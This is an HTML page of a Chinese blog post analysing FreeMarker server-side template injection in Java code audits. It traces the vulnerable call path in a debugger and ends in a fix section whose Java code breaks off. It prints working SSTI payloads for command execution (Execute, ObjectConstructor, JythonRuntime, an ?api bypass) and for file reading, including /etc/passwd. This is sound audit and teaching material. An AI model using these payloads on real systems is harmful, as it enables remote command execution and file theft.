

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">

  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.jpg">
  <link rel="icon" href="/img/fluid.jpg">
  

  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="huangdi">
  <meta name="keywords" content="">
  
    <meta name="description" content="FreeMarker，Velocity，Thymeleaf模板SSTI注入漏洞源码分析">
<meta property="og:type" content="article">
<meta property="og:title" content="Java代码审计中的SSTI">
<meta property="og:url" content="http://huang-d1.github.io/2025/07/16/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B8%AD%E7%9A%84SSTI/index.html">
<meta property="og:site_name" content="huangdi&#39;s blog">
<meta property="og:description" content="FreeMarker，Velocity，Thymeleaf模板SSTI注入漏洞源码分析">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://huang-d1.github.io/img/ssti(java)/ssti01.png">
<meta property="og:image" content="http://huang-d1.github.io/img/ssti(java)/ssti02.png">
<meta property="og:image" content="http://huang-d1.github.io/img/ssti(java)/ssti03.png">
<meta property="og:image" content="http://huang-d1.github.io/img/ssti(java)/ssti04.png">
<meta property="og:image" content="http://huang-d1.github.io/img/ssti(java)/ssti05.png">
<meta property="og:image" content="http://huang-d1.github.io/img/ssti(java)/ssti06.png">
<meta property="og:image" content="http://huang-d1.github.io/img/ssti(java)/ssti07.png">
<meta property="og:image" content="http://huang-d1.github.io/img/ssti(java)/ssti08.png">
<meta property="og:image" content="http://huang-d1.github.io/img/ssti(java)/ssti09.png">
<meta property="og:image" content="http://huang-d1.github.io/img/ssti(java)/ssti10.png">
<meta property="og:image" content="http://huang-d1.github.io/img/ssti(java)/ssti16.png">
<meta property="og:image" content="http://huang-d1.github.io/img/ssti(java)/ssti11.png">
<meta property="og:image" content="http://huang-d1.github.io/img/ssti(java)/ssti12.png">
<meta property="og:image" content="http://huang-d1.github.io/img/ssti(java)/ssti13.png">
<meta property="og:image" content="http://huang-d1.github.io/img/ssti(java)/ssti15.png">
<meta property="og:image" content="http://huang-d1.github.io/img/ssti(java)/ssti17.png">
<meta property="og:image" content="http://huang-d1.github.io/img/ssti(java)/ssti18.png">
<meta property="og:image" content="http://huang-d1.github.io/img/ssti(java)/ssti19.png">
<meta property="og:image" content="http://huang-d1.github.io/img/ssti(java)/ssti20.png">
<meta property="og:image" content="http://huang-d1.github.io/img/ssti(java)/ssti21.png">
<meta property="og:image" content="http://huang-d1.github.io/img/ssti(java)/ssti22.png">
<meta property="og:image" content="http://huang-d1.github.io/img/ssti(java)/ssti23.png">
<meta property="og:image" content="http://huang-d1.github.io/img/ssti(java)/ssti24.png">
<meta property="og:image" content="http://huang-d1.github.io/img/ssti(java)/ssti25.png">
<meta property="og:image" content="http://huang-d1.github.io/img/ssti(java)/ssti26.png">
<meta property="og:image" content="http://huang-d1.github.io/img/ssti(java)/ssti27.png">
<meta property="og:image" content="http://huang-d1.github.io/img/ssti(java)/ssti28.png">
<meta property="og:image" content="http://huang-d1.github.io/img/ssti(java)/ssti30.png">
<meta property="og:image" content="http://huang-d1.github.io/img/ssti(java)/ssti31.png">
<meta property="og:image" content="http://huang-d1.github.io/img/ssti(java)/ssti32.png">
<meta property="og:image" content="http://huang-d1.github.io/img/ssti(java)/ssti33.png">
<meta property="og:image" content="http://huang-d1.github.io/img/ssti(java)/ssti47.png">
<meta property="og:image" content="http://huang-d1.github.io/img/ssti(java)/ssti48.png">
<meta property="og:image" content="http://huang-d1.github.io/img/ssti(java)/ssti49.png">
<meta property="og:image" content="http://huang-d1.github.io/img/ssti(java)/ssti50.png">
<meta property="og:image" content="http://huang-d1.github.io/img/ssti(java)/ssti34.png">
<meta property="og:image" content="http://huang-d1.github.io/img/ssti(java)/ssti35.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200221001135320.png">
<meta property="og:image" content="http://huang-d1.github.io/img/ssti(java)/ssti36.png">
<meta property="og:image" content="http://huang-d1.github.io/img/ssti(java)/ssti37.png">
<meta property="og:image" content="http://huang-d1.github.io/img/ssti(java)/ssti38.png">
<meta property="og:image" content="http://huang-d1.github.io/img/ssti(java)/ssti39.png">
<meta property="og:image" content="http://huang-d1.github.io/img/ssti(java)/ssti40.png">
<meta property="og:image" content="http://huang-d1.github.io/img/ssti(java)/ssti41.png">
<meta property="og:image" content="http://huang-d1.github.io/img/ssti(java)/ssti42.png">
<meta property="og:image" content="http://huang-d1.github.io/img/ssti(java)/ssti43.png">
<meta property="og:image" content="http://huang-d1.github.io/img/ssti(java)/ssti44.png">
<meta property="og:image" content="http://huang-d1.github.io/img/ssti(java)/ssti45.png">
<meta property="og:image" content="http://huang-d1.github.io/img/ssti(java)/ssti46.png">
<meta property="article:published_time" content="2025-07-16T15:57:49.731Z">
<meta property="article:modified_time" content="2025-07-25T14:06:30.046Z">
<meta property="article:author" content="huangdi">
<meta property="article:tag" content="Java代码审计">
<meta property="article:tag" content="OWASP">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://huang-d1.github.io/img/ssti(java)/ssti01.png">
  
  
  
  <title>Java代码审计中的SSTI - huangdi&#39;s blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">



<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"huang-d1.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 7.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>huang-d1&#39;s blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="Java代码审计中的SSTI"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2025-07-16 23:57" pubdate>
          2025年7月16日 晚上
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          9.5k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          80 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">Java代码审计中的SSTI</h1>
            
            
              <div class="markdown-body">
                
                <h2 id="FreeMarker-SSTI"><a href="#FreeMarker-SSTI" class="headerlink" title="FreeMarker SSTI"></a>FreeMarker SSTI</h2><h3 id="FreeMarket基本语法"><a href="#FreeMarket基本语法" class="headerlink" title="FreeMarket基本语法"></a>FreeMarket基本语法</h3><h4 id="插值"><a href="#插值" class="headerlink" title="插值"></a>插值</h4><p><a target="_blank" rel="noopener" href="http://freemarker.foofun.cn/dgui_template_valueinsertion.html">插值 - FreeMarker 中文官方参考手册 (foofun.cn)</a></p>
<p>插值的使用格式是： <code>$&#123;expression&#125;</code>，这里的 <code>expression</code> 可以是所有种类的表达式(比如 <code>$&#123;100 + x&#125;</code>)。</p>
<p>插值是用来给表达式插入具体值然后转换为文本(字符串)。插值仅仅可以在两种位置使用：在文本区(比如 <code>&lt;h1&gt;Hello $&#123;name&#125;!&lt;/h1&gt;</code>) 和字符串表达式(比如 <code>&lt;#include &quot;/footer/$&#123;company&#125;.html&quot;&gt;</code>)中。</p>
<p>需要注意的是：如果插值在文本区 (也就是说，不在字符串表达式中)，如果 <code>escape</code> 指令起作用了，那么将被插入的字符串会被自动转义。</p>
<h4 id="FTL指令"><a href="#FTL指令" class="headerlink" title="FTL指令"></a>FTL指令</h4><p><a target="_blank" rel="noopener" href="http://freemarker.foofun.cn/dgui_template_directives.html">指令 - FreeMarker 中文官方参考手册 (foofun.cn)</a></p>
<p>使用&lt;# 指令 &gt;</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">eg. &lt;#local name=value&gt;<br></code></pre></td></tr></table></figure>

<h3 id="FreeMarker-SSTI-成因与攻击面"><a href="#FreeMarker-SSTI-成因与攻击面" class="headerlink" title="FreeMarker SSTI 成因与攻击面"></a>FreeMarker SSTI 成因与攻击面</h3><p>SSTI 的攻击面是模板引擎的渲染，要让 Web 服务器将 HTML 语句渲染为模板引擎，前提是要先有 HTML 语句。</p>
<p>将 HTML 语句放到服务器上有两种方法：</p>
<ul>
<li>1、文件上传 HTML 文件。</li>
<li>2、若某 CMS 自带有模板编辑功能(常见)</li>
</ul>
<h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><p>这里使用Drunkbaby的漏洞项目：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/Drun1baby/JavaSecurityLearning/tree/main/JavaSecurity">JavaSecurityLearning&#x2F;JavaSecurity at main · Drun1baby&#x2F;JavaSecurityLearning (github.com)</a></p>
<p>构造payload</p>
<p>freemarker.template.utility.Execute类中存在命令执行方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;#assign value=<span class="hljs-string">&quot;freemarker.template.utility.Execute&quot;</span>?<span class="hljs-keyword">new</span>()&gt;$&#123;value(<span class="hljs-string">&quot;Calc&quot;</span>)&#125;<br></code></pre></td></tr></table></figure>

<p>此项目没有写漏洞入口，所以利用时只能将payload直接插入.ftl中</p>
<p><img src="/img/ssti(java)/ssti01.png" srcset="/img/loading.gif" lazyload></p>
<p>成功执行</p>
<p><img src="/img/ssti(java)/ssti02.png" srcset="/img/loading.gif" lazyload></p>
<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>下一个断点在 <code>org.springframework.web.servlet.view.UrlBasedViewResolver#createView</code>，开始调试</p>
<p> <code>createView(String viewName, Locale locale)</code> 方法，用于创建视图对象(View)，它根据逻辑视图名的前缀，判断应该创建哪种类型的视图：重定向、转发，或默认处理方式。</p>
<p>在此处下断点是因为MVC 加载流程是从视图解析器到模板引擎，createView-&gt;loadView()-&gt;buildView()，buildView()方法开始有模板引擎参与</p>
<p><img src="/img/ssti(java)/ssti03.png" srcset="/img/loading.gif" lazyload></p>
<p>参考此文章：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/LittleHann/p/17846825.html#_lab2_0_4">Java模版引擎注入（SSTI）漏洞研究 - 郑瀚 - 博客园 (cnblogs.com)</a></p>
<p>如果对代码结构以及其中的类和方法了解不够透彻，可以直接在代码最后一步下断点，此漏洞是在命令执行方法处(freemarker&#x2F;template&#x2F;utility&#x2F;Execute.class类的exec方法下断点)，查看调用栈，判断触发ftl风险代码的调用栈从 哪里开始，再逐步分析</p>
<p>下断点后可以看到触发ftl风险代码的调用栈是从FreeMarkerview类的processTemplate方法开始的</p>
<p><img src="/img/ssti(java)/ssti04.png" srcset="/img/loading.gif" lazyload></p>
<p>根据调用栈跟进代码执行流程</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">exec</span>:75, Execute (freemarker.template.utility)<br>_eval:62, MethodCall (freemarker.core)<br><span class="hljs-built_in">eval</span>:101, Expression (freemarker.core)<br>calculateInterpolatedStringOrMarkup:100, DollarVariable (freemarker.core)<br>accept:63, DollarVariable (freemarker.core)<br>visit:334, Environment (freemarker.core)<br>visit:340, Environment (freemarker.core)<br>process:313, Environment (freemarker.core)<br>process:383, Template (freemarker.template)<br></code></pre></td></tr></table></figure>

<p>在开始处下断点进行调试</p>
<p><img src="/img/ssti(java)/ssti05.png" srcset="/img/loading.gif" lazyload></p>
<p>processTemplate-&gt;process()-&gt;visit()-&gt;pushElement()-&gt;element.accept()-&gt;getChildBuffer()-&gt;write()</p>
<p>process() 方法是做了一个输出（生成） HTML 文件或其他文件的工作，相当于渲染的最后一步了。</p>
<p>在 process() 方法中，会对 ftl 的文件进行遍历，读取一些信息，下面我们先说对于正常语句的处理，再说对于 ftl 表达式的处理。</p>
<p>在读取到每一条 freeMarker 表达式语句的时候，会二次调用 <code>visit()</code> 方法，</p>
<p><img src="/img/ssti(java)/ssti06.png" srcset="/img/loading.gif" lazyload></p>
<p>而 visit() 方法又调用了 element.accept()，</p>
<p><img src="/img/ssti(java)/ssti07.png" srcset="/img/loading.gif" lazyload></p>
<p>此处代码执行十分复杂，，建议直接根据刚才所看调用栈跟进函数更加清晰明了，不要一直动态调试步入</p>
<p>根据调用栈转到DollarVariable类accept方法，可以看到调用了calculateInterpolatedStringOrMarkup方法</p>
<p><img src="/img/ssti(java)/ssti08.png" srcset="/img/loading.gif" lazyload></p>
<p>跟进calculateInterpolatedStringOrMarkup方法，该方法做的业务是将模型强制为字符串或标记</p>
<p><img src="/img/ssti(java)/ssti09.png" srcset="/img/loading.gif" lazyload></p>
<p>跟进eval方法，可以看到eval函数对constantValue的值做了简单的判断，判定值为空后跟进 <code>this._eval()</code><img src="/img/ssti(java)/ssti10.png" srcset="/img/loading.gif" lazyload></p>
<p>一般的 <code>_eval()</code> 方法只是将 evn 获取一下,如下图</p>
<p>这是通过DollarVariable类accept方法-&gt;eval方法-&gt;_eval方法</p>
<p><img src="/img/ssti(java)/ssti16.png" srcset="/img/loading.gif" lazyload></p>
<p>但是这里的element的值是图中所示，可以从此处开始动态调试</p>
<p><img src="/img/ssti(java)/ssti11.png" srcset="/img/loading.gif" lazyload></p>
<p>append会调用assign类中的append方法做了一系列基础判断，先判断 <code>namespaceExp</code> 是否为 null，接着又判断 <code>this.operatorType </code>是否等于 65536</p>
<p><img src="/img/ssti(java)/ssti12.png" srcset="/img/loading.gif" lazyload></p>
<p>看到此处获取valueEXP，跟进eval方法</p>
<p><img src="/img/ssti(java)/ssti13.png" srcset="/img/loading.gif" lazyload></p>
<p>eval函数中判断constantValue值为空后，跟进_eval方法</p>
<p>经过一系列复杂的代码可以看到 <code>targetMethod</code> 目前就是我们在 ftl 语句当中构造的那个能够进行命令执行的类</p>
<p><img src="/img/ssti(java)/ssti15.png" srcset="/img/loading.gif" lazyload></p>
<p>此时这一个语句相当于</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> targetMethod.exec(argumentStrings);<br><span class="hljs-comment">// 等价于</span><br><span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> freemarker.template.utility.Execute.exec(argumentStrings);<br></code></pre></td></tr></table></figure>

<p>而这一步并非直接进行命令执行，而是先把这个类通过 <code>newInstance()</code> 的方式进行初始化。</p>
<p>命令执行的参数，会被拿出来，在下一次的同样流程中作为命令被执行，如图</p>
<p><img src="/img/ssti(java)/ssti17.png" srcset="/img/loading.gif" lazyload></p>
<p>至此，漏洞代码分析结束。</p>
<p>ai了一下_eval代码的含义</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">TemplateModel <span class="hljs-title function_">_eval</span><span class="hljs-params">(Environment env)</span> <span class="hljs-keyword">throws</span> TemplateException &#123;<br>    <span class="hljs-type">TemplateModel</span> <span class="hljs-variable">targetModel</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.target.eval(env);<br></code></pre></td></tr></table></figure>

<p>定义一个 <code>_eval</code> 方法，返回一个 <code>TemplateModel</code>（FreeMarker 中的通用模型类型）。</p>
<p>调用 <code>this.target.eval(env)</code> 解析出当前要执行的目标对象（可能是方法或变量），并赋值给 <code>targetModel</code>。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (targetModel <span class="hljs-keyword">instanceof</span> TemplateMethodModel) &#123;<br>    <span class="hljs-type">TemplateMethodModel</span> <span class="hljs-variable">targetMethod</span> <span class="hljs-operator">=</span> (TemplateMethodModel) targetModel;<br></code></pre></td></tr></table></figure>

<p>如果目标是一个模板方法（<code>TemplateMethodModel</code>），就将其强制类型转换为 <code>targetMethod</code>。</p>
<p>此段代码会判断element中的值是方法还是参数，对应传给不同变量，以确保命令的正确拼接</p>
<h3 id="FreeMarker-SSTI-的攻防二象性"><a href="#FreeMarker-SSTI-的攻防二象性" class="headerlink" title="FreeMarker SSTI 的攻防二象性"></a>FreeMarker SSTI 的攻防二象性</h3><p>现在使用的poc</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">&lt;#assign value=&quot;freemarker.template.utility.Execute&quot;?new()&gt;$&#123;value(&quot;Calc&quot;)&#125;<br></code></pre></td></tr></table></figure>

<p>这是 FreeMarker 的内置函数 new 导致的，下面简单介绍一下 FreeMarker的两个内置函数—— <code>new</code> 和 <code>api</code></p>
<h4 id="内置函数-new"><a href="#内置函数-new" class="headerlink" title="内置函数 new"></a>内置函数 new</h4><p>可创建任意实现了 <code>TemplateModel</code> 接口的 Java 对象，同时还可以触发没有实现 <code>TemplateModel</code> 接口的类的静态初始化块。<br>以下两种常见的FreeMarker模版注入poc就是利用new函数，创建了继承 <code>TemplateModel</code> 接口的 <code>freemarker.template.utility.JythonRuntime</code> 和<code>freemarker.template.utility.Execute</code></p>
<h4 id="API"><a href="#API" class="headerlink" title="API"></a>API</h4><p><code>value?api</code> 提供对 value 的 API（通常是 Java API）的访问，例如 <code>value?api.someJavaMethod()</code> 或 <code>value?api.someBeanProperty</code>。可通过 <code>getClassLoader</code>获取类加载器从而加载恶意类，或者也可以通过 <code>getResource</code>来实现任意文件读取。<br>但是，当<code>api_builtin_enabled</code>为 true 时才可使用 api 函数，而该配置在 <strong>2.3.22 版本</strong>之后默认为 false。</p>
<ul>
<li>由此我们可以构造出一系列的 bypass PoC</li>
</ul>
<p>POC1</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;#assign classLoader=object?api.class.protectionDomain.classLoader&gt; <br>&lt;#assign clazz=classLoader.loadClass(<span class="hljs-string">&quot;ClassExposingGSON&quot;</span>)&gt; <br>&lt;#assign field=clazz?api.getField(<span class="hljs-string">&quot;GSON&quot;</span>)&gt; <br>&lt;#assign gson=field?api.get(<span class="hljs-literal">null</span>)&gt; <br>&lt;#assign ex=gson?api.fromJson(<span class="hljs-string">&quot;&#123;&#125;&quot;</span>, classLoader.loadClass(<span class="hljs-string">&quot;freemarker.template.utility.Execute&quot;</span>))&gt; <br>$&#123;ex(<span class="hljs-string">&quot;Calc&quot;</span><span class="hljs-string">&quot;)&#125;</span><br></code></pre></td></tr></table></figure>

<p>POC2</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;#assign value=<span class="hljs-string">&quot;freemarker.template.utility.ObjectConstructor&quot;</span>?<span class="hljs-keyword">new</span>()&gt;$&#123;value(<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>,<span class="hljs-string">&quot;Calc&quot;</span>).start()&#125;<br></code></pre></td></tr></table></figure>

<p>POC3</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;#assign value=<span class="hljs-string">&quot;freemarker.template.utility.JythonRuntime&quot;</span>?<span class="hljs-keyword">new</span>()&gt;&lt;<span class="hljs-meta">@value</span>&gt;<span class="hljs-keyword">import</span> os;os.system(<span class="hljs-string">&quot;calc&quot;</span>)<br></code></pre></td></tr></table></figure>

<p>POC4</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;#assign ex=<span class="hljs-string">&quot;freemarker.template.utility.Execute&quot;</span>?<span class="hljs-keyword">new</span>()&gt; $&#123; ex(<span class="hljs-string">&quot;Calc&quot;</span>) &#125;<br></code></pre></td></tr></table></figure>

<p>读取文件</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;#assign is=object?api.class.getResourceAsStream(<span class="hljs-string">&quot;/Test.class&quot;</span>)&gt;<br>FILE:[&lt;#list <span class="hljs-number">0.</span><span class="hljs-number">.999999999</span> as _&gt;<br>    &lt;#assign <span class="hljs-type">byte</span>=is.read()&gt;<br>    &lt;#<span class="hljs-keyword">if</span> <span class="hljs-type">byte</span> == -<span class="hljs-number">1</span>&gt;<br>        &lt;#<span class="hljs-keyword">break</span>&gt;<br>    &lt;/#<span class="hljs-keyword">if</span>&gt;<br>$&#123;<span class="hljs-type">byte</span>&#125;, &lt;/#list&gt;]<br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;#assign uri=object?api.class.getResource(<span class="hljs-string">&quot;/&quot;</span>).toURI()&gt;<br>&lt;#assign input=uri?api.create(<span class="hljs-string">&quot;file:///etc/passwd&quot;</span>).toURL().openConnection()&gt;<br>&lt;#assign is=input?api.getInputStream()&gt;<br>FILE:[&lt;#list <span class="hljs-number">0.</span><span class="hljs-number">.999999999</span> as _&gt;<br>    &lt;#assign <span class="hljs-type">byte</span>=is.read()&gt;<br>    &lt;#<span class="hljs-keyword">if</span> <span class="hljs-type">byte</span> == -<span class="hljs-number">1</span>&gt;<br>        &lt;#<span class="hljs-keyword">break</span>&gt;<br>    &lt;/#<span class="hljs-keyword">if</span>&gt;<br>$&#123;<span class="hljs-type">byte</span>&#125;, &lt;/#list&gt;]<br></code></pre></td></tr></table></figure>

<h4 id="修复和防御"><a href="#修复和防御" class="headerlink" title="修复和防御"></a>修复和防御</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Configuration</span> <span class="hljs-variable">cfg</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Configuration</span>();<br>cfg.setNewBuiltinClassResolver(TemplateClassResolver.SAFER_RESOLVER);<br></code></pre></td></tr></table></figure>

<p>设置cfg.setNewBuiltinClassResolver(TemplateClassResolver.SAFER_RESOLVER);，它会加入一个校验，将freemarker.template.utility.JythonRuntime、freemarker.template.utility.Execute、freemarker.template.utility.ObjectConstructor过滤。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> freemarker.core.TemplateClassResolver;<br><span class="hljs-keyword">import</span> freemarker.template.Configuration;<br><span class="hljs-keyword">import</span> freemarker.template.Template;<br><br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.FileWriter;<br><span class="hljs-keyword">import</span> java.io.Writer;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">exec_pcc</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//1.创建配置类</span><br>        <span class="hljs-type">Configuration</span> <span 